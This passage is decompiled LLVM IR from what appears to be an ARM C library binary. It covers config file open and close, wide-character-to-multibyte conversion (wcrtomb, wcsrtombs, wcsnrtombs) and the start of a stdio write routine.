  %v0_19318 = phi i32 [ %v1_19314, %dec_label_pc_19314 ], [ %v5_192fc, %dec_label_pc_192f4 ]
  %v1_19318 = add i32 %v0_19318, -1
  %v2_19318 = inttoptr i32 %v1_19318 to i8*
  %v3_19318 = load i8, i8* %v2_19318, align 1
  %v4_19318 = zext i8 %v3_19318 to i32
  %v0_1931c = load i32, i32* @sl, align 4
  store i32 %v0_1931c, i32* @r0, align 4
  %v2_19320 = call i32 @__GI_strchr(i32 %v0_1931c, i32 %v4_19318)
  store i32 %v2_19320, i32* %r0.global-to-local, align 4
  %v2_19324 = icmp eq i32 %v2_19320, 0
  store i1 %v2_19324, i1* %cpsr_z.global-to-local, align 1
  %v0_1932c.pre = load i32, i32* @r4, align 4
  br i1 %v2_19324, label %dec_label_pc_1932c, label %dec_label_pc_19314

dec_label_pc_1932c:                               ; preds = %dec_label_pc_19318, %dec_label_pc_192f4, %dec_label_pc_192d4
  %v3_19338 = phi i32 [ %v5_192fc, %dec_label_pc_192f4 ], [ %v2_192ec, %dec_label_pc_192d4 ], [ %v0_1932c.pre, %dec_label_pc_19318 ]
  %v1_1932c = inttoptr i32 %v3_19338 to i8*
  %v2_1932c = load i8, i8* %v1_1932c, align 1
  %v3_1932c = zext i8 %v2_1932c to i32
  store i32 %v3_1932c, i32* %r2.global-to-local, align 4
  %v0_19330 = load i32, i32* @r7, align 4
  %v1_19330 = inttoptr i32 %v0_19330 to i8*
  %v2_19330 = load i8, i8* %v1_19330, align 1
  %v3_19330 = zext i8 %v2_19330 to i32
  store i32 %v3_19330, i32* %r3.global-to-local, align 4
  %v9_19334 = icmp eq i8 %v2_19330, %v2_1932c
  store i1 %v9_19334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19334, label %bb71, label %dec_label_pc_19340

bb71:                                             ; preds = %dec_label_pc_1932c
  %v1_19338 = load i32, i32* @fp, align 4
  %v2_19338 = trunc i32 %v1_19338 to i8
  store i8 %v2_19338, i8* %v1_1932c, align 1
  %v0_1933c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1933c.pr, label %bb73, label %.dec_label_pc_19340_crit_edge

.dec_label_pc_19340_crit_edge:                    ; preds = %bb71
  %v0_19340.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19340

dec_label_pc_19340:                               ; preds = %.dec_label_pc_19340_crit_edge, %dec_label_pc_1932c
  %v0_19340 = phi i32 [ %v0_19340.pre, %.dec_label_pc_19340_crit_edge ], [ %v3_1932c, %dec_label_pc_1932c ]
  %v2_19340 = icmp eq i32 %v0_19340, 0
  store i1 %v2_19340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19340, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_19340
  %v1_19344 = load i32, i32* @fp, align 4
  %v2_19344 = trunc i32 %v1_19344 to i8
  %v3_19344 = load i32, i32* @r4, align 4
  %v4_19344 = inttoptr i32 %v3_19344 to i8*
  store i8 %v2_19344, i8* %v4_19344, align 1
  %v5_19344 = load i32, i32* @r4, align 4
  %v6_19344 = add i32 %v5_19344, 1
  store i32 %v6_19344, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_19340, %bb72
  %v2_19348 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_19348, i32* %r3.global-to-local, align 4
  %v2_1934c = icmp eq i32 %v2_19348, 0
  store i1 %v2_1934c, i1* %cpsr_z.global-to-local, align 1
  %v0_19368.pre = load i32, i32* @r4, align 4
  br i1 %v2_1934c, label %dec_label_pc_19364, label %dec_label_pc_19354

dec_label_pc_19354:                               ; preds = %bb73
  store i32 %v0_19368.pre, i32* @r0, align 4
  %v1_1935c = inttoptr i32 %v0_19368.pre to i8*
  %v2_1935c = call i32 @__GI_strspn(i8* %v1_1935c)
  store i32 %v2_1935c, i32* %r0.global-to-local, align 4
  %v0_19360 = load i32, i32* @r4, align 4
  %v2_19360 = add i32 %v0_19360, %v2_1935c
  store i32 %v2_19360, i32* @r4, align 4
  br label %dec_label_pc_19364

dec_label_pc_19364:                               ; preds = %bb73, %dec_label_pc_19354
  %v0_19368 = phi i32 [ %v2_19360, %dec_label_pc_19354 ], [ %v0_19368.pre, %bb73 ]
  %v0_19364 = load i32, i32* @r6, align 4
  %v1_19364 = add i32 %v0_19364, 1
  store i32 %v1_19364, i32* @r6, align 4
  %v1_19368 = inttoptr i32 %v0_19368 to i8*
  %v2_19368 = load i8, i8* %v1_19368, align 1
  %v3_19368 = zext i8 %v2_19368 to i32
  store i32 %v3_19368, i32* %r2.global-to-local, align 4
  %v2_1936c = icmp eq i8 %v2_19368, 0
  store i1 %v2_1936c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1936c, label %dec_label_pc_19384, label %dec_label_pc_19364.dec_label_pc_19374_crit_edge

dec_label_pc_19364.dec_label_pc_19374_crit_edge:  ; preds = %dec_label_pc_19364
  %v0_19374.pre = load i32, i32* @r7, align 4
  %v1_19374 = inttoptr i32 %v0_19374.pre to i8*
  %v2_19374 = load i8, i8* %v1_19374, align 1
  %v3_19374 = zext i8 %v2_19374 to i32
  store i32 %v3_19374, i32* %r3.global-to-local, align 4
  %v9_19378 = icmp eq i8 %v2_19374, %v2_19368
  store i1 %v9_19378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19378, label %dec_label_pc_19384, label %bb74

bb74:                                             ; preds = %dec_label_pc_19374.preheader, %dec_label_pc_19364.dec_label_pc_19374_crit_edge
  %v2_192c088 = phi i32 [ %v1_19364, %dec_label_pc_19364.dec_label_pc_19374_crit_edge ], [ %v1_192a4, %dec_label_pc_19374.preheader ]
  %v0_192c087 = phi i32 [ %v0_19368, %dec_label_pc_19364.dec_label_pc_19374_crit_edge ], [ %v0_1936813, %dec_label_pc_19374.preheader ]
  %v2_1937c = load i32, i32* @sb, align 4
  %v3_1937c = sub i32 %v2_192c088, %v2_1937c
  %v5_1937c = xor i32 %v2_1937c, %v2_192c088
  %v6_1937c = xor i32 %v3_1937c, %v2_192c088
  %v7_1937c = and i32 %v6_1937c, %v5_1937c
  %v8_1937c = icmp slt i32 %v7_1937c, 0
  %v9_1937c = icmp slt i32 %v3_1937c, 0
  %v10_1937c = icmp eq i32 %v2_192c088, %v2_1937c
  store i1 %v10_1937c, i1* %cpsr_z.global-to-local, align 1
  %v2_19380 = xor i1 %v9_1937c, %v8_1937c
  br i1 %v2_19380, label %dec_label_pc_192b0, label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19374.preheader, %bb74, %dec_label_pc_19364, %dec_label_pc_19364.dec_label_pc_19374_crit_edge, %dec_label_pc_19368.preheader
  %v0_19388 = phi i32 [ %v1_192a4, %dec_label_pc_19368.preheader ], [ %v1_192a4, %dec_label_pc_19374.preheader ], [ %v2_192c088, %bb74 ], [ %v1_19364, %dec_label_pc_19364 ], [ %v1_19364, %dec_label_pc_19364.dec_label_pc_19374_crit_edge ]
  store i32 %v3_190a8, i32* %r2.global-to-local, align 4
  %v9_19388 = icmp eq i32 %v0_19388, %v3_190a8
  store i1 %v9_19388, i1* %cpsr_z.global-to-local, align 1
  %v6_1938c = icmp slt i32 %v0_19388, %v3_190a8
  br i1 %v6_1938c, label %dec_label_pc_19390, label %dec_label_pc_1939c

dec_label_pc_19390:                               ; preds = %dec_label_pc_19384
  %v0_19390 = load i32, i32* @r8, align 4
  %v1_19390 = and i32 %v0_19390, 1048576
  %v2_19390 = icmp eq i32 %v1_19390, 0
  store i1 %v2_19390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19390, label %dec_label_pc_190e8.backedge, label %dec_label_pc_19398

dec_label_pc_19398:                               ; preds = %dec_label_pc_19390, %dec_label_pc_19250, %.thread, %entry
  br label %dec_label_pc_1939c

dec_label_pc_1939c:                               ; preds = %dec_label_pc_19384, %dec_label_pc_1916c, %dec_label_pc_19398
  %v0_1939c = phi i32 [ %v0_1917c, %dec_label_pc_1916c ], [ 0, %dec_label_pc_19398 ], [ %v0_19388, %dec_label_pc_19384 ]
  store i32 %v0_1939c, i32* %r0.global-to-local, align 4
  store i32 %v3_19084, i32* @r4, align 4
  store i32 %v6_19084, i32* @r5, align 4
  store i32 %v9_19084, i32* @r6, align 4
  store i32 %v12_19084, i32* @r7, align 4
  store i32 %v15_19084, i32* @r8, align 4
  store i32 %v18_19084, i32* @sb, align 4
  store i32 %v21_19084, i32* @sl, align 4
  store i32 %v24_19084, i32* @fp, align 4
  ret i32 %v0_1939c

; uselistorder directives
  uselistorder i32 %v0_1939c, { 1, 0 }
  uselistorder i32 %v0_19388, { 0, 2, 1 }
  uselistorder i32 %v3_1937c, { 1, 0 }
  uselistorder i32 %v2_1937c, { 1, 0, 2 }
  uselistorder i32 %v2_192c088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_19378, { 1, 0 }
  uselistorder i32 %v0_19368.pre, { 0, 2, 1 }
  uselistorder i32 %v5_192fc, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1937886, { 1, 0 }
  uselistorder i1 %v9_192a0, { 1, 0 }
  uselistorder i32 %v3_19278, { 0, 2, 1, 3 }
  uselistorder i1 %v7_19250, { 1, 0 }
  uselistorder i1 %v8_19248, { 1, 0 }
  uselistorder i32 %v3_19218, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_19208, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_191f0, { 1, 0, 2 }
  uselistorder i32 %v1_191e0, { 1, 0, 2 }
  uselistorder i32 %v0_191cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_191c4, { 1, 0 }
  uselistorder i32 %v1_191b0, { 1, 0 }
  uselistorder i32 %v1_191ac, { 1, 0 }
  uselistorder i32 %v2_19188, { 1, 0 }
  uselistorder i32 %v1_1916c, { 2, 0, 1 }
  uselistorder i32 %v0_19154, { 1, 0 }
  uselistorder i32 %v1_19144, { 0, 2, 1 }
  uselistorder i1 %v2_19274, { 1, 0, 2, 3 }
  uselistorder i32 %v1_190d0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_190c4, { 2, 1, 0 }
  uselistorder i32 %v3_190ac, { 1, 0 }
  uselistorder i32 %v3_190a8, { 2, 1, 0 }
  uselistorder i32 %v1_190a0, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 33, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_1939c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19384, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_19364, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19318, { 1, 0 }
  uselistorder label %dec_label_pc_190e8.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19290, { 1, 0 }
  uselistorder label %dec_label_pc_19250, { 1, 0 }
  uselistorder label %dec_label_pc_19244, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19208, { 1, 0 }
  uselistorder label %dec_label_pc_1913c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_193b0 = icmp eq i32* %arg1, null
  br i1 %v2_193b0, label %dec_label_pc_193d8, label %dec_label_pc_193b8

dec_label_pc_193b8:                               ; preds = %entry
  %v2_193b8 = load i32, i32* %arg1, align 4
  %v1_193bc = inttoptr i32 %v2_193b8 to i16*
  %v2_193bc = call i32 @__GI_fclose(i16* %v1_193bc)
  %v0_193c0 = load i32, i32* @r4, align 4
  %v1_193c0 = add i32 %v0_193c0, 20
  %v2_193c0 = inttoptr i32 %v1_193c0 to i32*
  %v3_193c0 = load i32, i32* %v2_193c0, align 4
  %v2_193c4 = icmp eq i32 %v3_193c0, 0
  br i1 %v2_193c4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_193b8
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_193b8, %bb
  store i32 103376, i32* @lr, align 4
  %v1_193cc = xor i1 %v2_193c4, true
  call void @__pseudo_cond_branch(i1 %v1_193cc, i32 ptrtoint (i32* @global_var_16e04.850 to i32))
  %v0_193d0 = load i32, i32* @r4, align 4
  store i32 %v0_193d0, i32* @r0, align 4
  %v0_193d4 = call i32 @free()
  br label %dec_label_pc_193d8

dec_label_pc_193d8:                               ; preds = %entry, %bb6
  %v1_193dc = phi i32 [ 0, %entry ], [ %v0_193d4, %bb6 ]
  ret i32 %v1_193dc

; uselistorder directives
  uselistorder label %dec_label_pc_193d8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_193ec = load i32, i32* @r4, align 4
  store i32 %v3_193ec, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35312), i32* @r1, align 4
  %v0_193f4 = load i32, i32* @r0, align 4
  %v2_193f4 = call i32 @__GI_fopen(i32 %v0_193f4, i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35312))
  store i32 %v2_193f4, i32* %r0.global-to-local, align 4
  store i32 %v2_193f4, i32* @r4, align 4
  %v2_193f8 = icmp eq i32 %v2_193f4, 0
  br i1 %v2_193f8, label %bb, label %dec_label_pc_19404

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_19404:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1940c = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1940c, i32* %r0.global-to-local, align 4
  %v2_19410 = icmp eq i32 %v2_1940c, 0
  br i1 %v2_19410, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_19404
  %v1_19414 = load i32, i32* @r4, align 4
  %v3_19414 = inttoptr i32 %v2_1940c to i32*
  store i32 %v1_19414, i32* %v3_19414, align 4
  %v1_1941c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_19404, %bb4
  %v1_1941c = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_19404 ], [ %v1_1941c.pre, %bb4 ]
  %v2_19418 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19418, i32* @r4, align 4
  ret i32 %v1_1941c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35312), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_19428 = load i32, i32* @lr, align 4
  %v2_1942c = icmp eq i32 %arg1, 0
  br i1 %v2_1942c, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_19434 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_1945c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_19448 = phi i32 [ %arg1, %.thread ], [ %v3_19434, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_19444 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_19444, i32* @ip, align 4
  %v2_1944c = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_19444, i32* %stack_var_-16, align 4
  store i32 %v0_1945c, i32* %stack_var_-12, align 4
  %v5_19464 = inttoptr i32 %v0_19448 to i8*
  %v6_19464 = call i32 @__GI_wcsnrtombs(i8* %v5_19464, i32 %v2_1944c, i32 1, i32 16, i32 %arg3)
  %v2_19468 = icmp eq i32 %v6_19464, 0
  br i1 %v2_19468, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_19478 = phi i32 [ %v6_19464, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_19428, i32* @lr, align 4
  ret i32 %v1_19478

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_19490 = load i32, i32* @r0, align 4
  %v1_19490 = load i32, i32* @r1, align 4
  %v5_19490 = inttoptr i32 %v0_19490 to i8*
  %v6_19490 = call i32 @__GI_wcsnrtombs(i8* %v5_19490, i32 %v1_19490, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_19490

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_194a0 = load i32, i32* @r4, align 4
  store i32 %v3_194a0, i32* %stack_var_-12, align 4
  %v10_194a4 = icmp eq i32 %tmp, %arg2
  store i1 %v10_194a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_194a4, label %dec_label_pc_194bc, label %bb

bb:                                               ; preds = %entry
  %v4_194a8 = icmp eq i8* %arg1, null
  store i1 %v4_194a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_194a8, label %dec_label_pc_194bc.thread, label %bb39

dec_label_pc_194bc.thread:                        ; preds = %bb
  %v2_194ac = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_194bc:                               ; preds = %entry
  %v2_194ac1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_194bc = icmp eq i8* %arg1, null
  store i1 %v3_194bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_194bc, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_194bc
  store i32 %v2_194ac1, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_194bc, %dec_label_pc_194bc.thread
  %storemerge20 = phi i32 [ %v2_194ac1, %dec_label_pc_194bc ], [ %v2_194ac, %dec_label_pc_194bc.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1951828 = phi i32 [ %v2_194ac1, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_194d4 = load i32, i32* @r3, align 4
  %v3_194d4 = icmp uge i32 %v0_194d4, %arg3
  %arg3.v0_194d4 = select i1 %v3_194d4, i32 %arg3, i32 %v0_194d4
  store i32 %arg3.v0_194d4, i32* %r5.global-to-local, align 4
  %v1_194e0 = inttoptr i32 %arg2 to i32*
  %v2_194e0 = load i32, i32* %v1_194e0, align 4
  store i32 %v2_194e0, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_194d4, i32* %r0.global-to-local, align 4
  %v2_1952c22 = icmp eq i32 %arg3.v0_194d4, 0
  store i1 %v2_1952c22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1952c22, label %dec_label_pc_19534, label %dec_label_pc_194ec

dec_label_pc_194ec:                               ; preds = %.thread14.thread, %dec_label_pc_19524.dec_label_pc_194ec_crit_edge
  %v2_19518 = phi i32 [ %v2_19524, %dec_label_pc_19524.dec_label_pc_194ec_crit_edge ], [ %v2_1951828, %.thread14.thread ]
  %v0_194f8 = phi i32 [ %v0_194ec.pre, %dec_label_pc_19524.dec_label_pc_194ec_crit_edge ], [ %v2_194e0, %.thread14.thread ]
  %v1_194ec = inttoptr i32 %v0_194f8 to i32*
  %v2_194ec = load i32, i32* %v1_194ec, align 4
  %v7_194f0 = icmp eq i32 %v2_194ec, 127
  store i1 %v7_194f0, i1* %cpsr_z.global-to-local, align 1
  %v1_194f4 = urem i32 %v2_194ec, 256
  store i32 %v1_194f4, i32* @ip, align 4
  %v1_194f8 = add i32 %v0_194f8, 4
  store i32 %v1_194f8, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_194ec, 128
  br i1 %tmp45, label %dec_label_pc_19514, label %dec_label_pc_19500

dec_label_pc_19500:                               ; preds = %dec_label_pc_194ec
  %v0_19500 = call i32 @__GI___errno_location()
  store i32 %v0_19500, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1950c = inttoptr i32 %v0_19500 to i32*
  store i32 84, i32* %v2_1950c, align 4
  %v0_19540.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19540

dec_label_pc_19514:                               ; preds = %dec_label_pc_194ec
  %v2_19514 = icmp eq i32 %v1_194f4, 0
  store i1 %v2_19514, i1* %cpsr_z.global-to-local, align 1
  %v1_19518 = trunc i32 %v2_194ec to i8
  %v3_19518 = inttoptr i32 %v2_19518 to i8*
  store i8 %v1_19518, i8* %v3_19518, align 1
  %v0_1951c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1951c, label %.dec_label_pc_19534_crit_edge, label %dec_label_pc_19524

dec_label_pc_19524:                               ; preds = %dec_label_pc_19514
  %v0_19524 = load i32, i32* %lr.global-to-local, align 4
  %v1_19524 = load i32, i32* %r4.global-to-local, align 4
  %v2_19524 = add i32 %v1_19524, %v0_19524
  store i32 %v2_19524, i32* %lr.global-to-local, align 4
  %v0_19528 = load i32, i32* %r0.global-to-local, align 4
  %v1_19528 = add i32 %v0_19528, -1
  store i32 %v1_19528, i32* %r0.global-to-local, align 4
  %v2_1952c = icmp eq i32 %v1_19528, 0
  store i1 %v2_1952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1952c, label %dec_label_pc_19534, label %dec_label_pc_19524.dec_label_pc_194ec_crit_edge

dec_label_pc_19524.dec_label_pc_194ec_crit_edge:  ; preds = %dec_label_pc_19524
  %v0_194ec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_194ec

.dec_label_pc_19534_crit_edge:                    ; preds = %dec_label_pc_19514
  %v1_1951c = load i32, i32* @ip, align 4
  store i32 %v1_1951c, i32* %r2.global-to-local, align 4
  %v0_19534.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_19524, %.dec_label_pc_19534_crit_edge, %.thread14.thread
  %v0_19534 = phi i32 [ %v0_19534.pre, %.dec_label_pc_19534_crit_edge ], [ %v2_1951828, %.thread14.thread ], [ %v2_19524, %dec_label_pc_19524 ]
  %v1_19534 = load i32, i32* @sp, align 4
  %v9_19534 = icmp eq i32 %v0_19534, %v1_19534
  store i1 %v9_19534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19534, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_19534
  %v1_19538 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_19538, i32* %v1_194e0, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_19534, %bb43
  %v0_1953c = load i32, i32* %r0.global-to-local, align 4
  %v1_1953c = load i32, i32* %r5.global-to-local, align 4
  %v2_1953c = sub i32 %v1_1953c, %v0_1953c
  store i32 %v2_1953c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19540

dec_label_pc_19540:                               ; preds = %dec_label_pc_19500, %bb44
  %v0_19540 = phi i32 [ %v0_19540.pre, %dec_label_pc_19500 ], [ %v2_1953c, %bb44 ]
  store i32 %v0_19540, i32* %r0.global-to-local, align 4
  %v2_19548 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19548, i32* %r4.global-to-local, align 4
  ret i32 %v0_19540

; uselistorder directives
  uselistorder i32 %v0_19540, { 1, 0 }
  uselistorder i32 %v1_19528, { 1, 0 }
  uselistorder i32 %v2_19524, { 0, 2, 1 }
  uselistorder i32 %v1_194f4, { 1, 0 }
  uselistorder i32 %v2_194ec, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1951828, { 1, 0 }
  uselistorder i32 %v2_194ac1, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 3, 5, 1, 6, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 9, 6, 0, 7, 8 }
  uselistorder i32 127, { 2, 0, 3, 4, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19540, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_19534, { 1, 0, 2 }
  uselistorder label %dec_label_pc_194ec, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19550 = load i32, i32* @r4, align 4
  store i32 %v3_19550, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_195682 = icmp eq i32 %arg3, 0
  store i1 %v2_195682, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195682, label %dec_label_pc_195f8, label %dec_label_pc_19570

dec_label_pc_19568thread-pre-split:               ; preds = %dec_label_pc_19570
  %v3_19588 = load i32, i32* %r6.global-to-local, align 4
  %v5_19588 = add i32 %v3_19588, %v3_19580
  store i32 %v5_19588, i32* %r6.global-to-local, align 4
  %v4_1958c = load i32, i32* %r5.global-to-local, align 4
  %v5_1958c = sub i32 %v4_1958c, %v3_19580
  store i32 %v5_1958c, i32* %r5.global-to-local, align 4
  %v2_19568 = icmp eq i32 %v5_1958c, 0
  store i1 %v2_19568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19568, label %dec_label_pc_19568.dec_label_pc_195f8.loopexit_crit_edge, label %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge

dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge: ; preds = %dec_label_pc_19568thread-pre-split
  %v3_19570.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1957c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19570

dec_label_pc_19570:                               ; preds = %entry, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge
  %v0_1957c = phi i32 [ %v0_1957c.pre, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge ], [ %tmp, %entry ]
  %v0_19578 = phi i32 [ %v5_19588, %dec_label_pc_19568thread-pre-split.dec_label_pc_19570_crit_edge ], [ %arg2, %entry ]
